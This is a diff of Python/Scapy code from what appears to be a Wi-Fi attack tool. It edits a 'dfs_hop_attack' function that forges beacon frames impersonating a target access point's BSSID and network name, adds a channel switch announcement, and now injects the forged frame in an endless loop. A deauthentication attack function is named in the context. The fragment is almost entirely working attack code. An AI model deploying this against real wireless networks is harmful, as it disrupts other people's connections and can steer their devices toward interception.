@@ -77,8 +77,8 @@ def eapol_attack_deauth(interface: MonitorInterface, ap: AP, sta: Station, spam:
 
 
 def dfs_hop_attack(interface: MonitorInterface, ap: AP, essid: str, channel: int):
-    pkt = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=ap.bssid, addr3=ap.bssid) / \
-          Dot11Beacon(cap=0x9104) / Dot11Elt(ID='SSID', info="WAT", len=len("WAT")) / \
+    pkt = RadioTap() / Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=ap.bssid, addr3=ap.bssid) / \
+          Dot11Beacon(cap=0x9104) / Dot11Elt(ID='SSID', info=essid, len=len(essid)) / \
           Dot11Elt(ID='RSNinfo', info=(
               '\x01\x00'  # RSN Version 1
               '\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
@@ -87,8 +87,9 @@ def dfs_hop_attack(interface: MonitorInterface, ap: AP, essid: str, channel: int
               '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
               '\x00\x0f\xac\x02'  # Pre-Shared Key
               '\xcc\x00'  # Supports and requires MFP
-          )) / Dot11Elt(ID=37, len=3, info=('\x00' + bytes([channel]) + '\x09\x01'))
-    interface.inject(pkt)
+          )) / Dot11Elt(ID=37, len=3, info=bytes([0, channel, 1]))
+    while True:
+        interface.inject(pkt, 0.5)
 
 
 class Dot11EltRates(Packet):
